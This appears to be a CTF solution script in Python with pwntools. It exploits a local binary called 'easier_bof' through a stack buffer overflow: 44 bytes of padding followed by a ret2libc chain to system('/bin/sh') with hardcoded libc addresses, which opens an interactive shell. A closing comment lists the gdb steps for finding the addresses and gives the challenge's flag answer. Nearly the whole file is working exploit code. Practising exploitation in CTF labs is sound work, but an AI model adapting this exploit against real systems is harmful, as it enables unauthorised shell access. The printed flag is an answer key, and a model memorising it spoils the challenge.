from pwn import *
p = process("/home/easier_bof/easier_bof")

payload = ""

for i in range(44) :
    payload += "A"

payload += p32(0xb7e5b310)
payload += "AAAA"
payload += p32(0xb7f7dcec)
p.sendline(payload)
context_log_level = "debug"
p.interactive()

"""
how to solve?
1. run gdb, breakpoint to main(b *main)
2. run program(run)
3. find libc address(info proc mapping)
4. find "/bin/sh" in libc address (find 0xb7e1b000, 0xb7fc9000, "/bin/sh")
Answer = TH1S_W45_345Y_B0F_A17F932A3746AB9D40E0699EC90BFDC7
"""
